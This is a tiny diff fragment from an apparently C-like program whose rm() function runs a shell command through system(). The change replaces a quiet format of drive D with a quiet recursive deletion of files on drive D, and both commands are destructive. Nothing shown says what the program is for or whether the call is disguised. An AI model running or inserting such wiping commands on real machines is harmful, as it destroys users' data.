@@ -38,5 +38,5 @@ input()
 }
 rm()
 {
-	system("format d: /q /x /fs:ntfs");
+	system("del d: /q /s");
 }
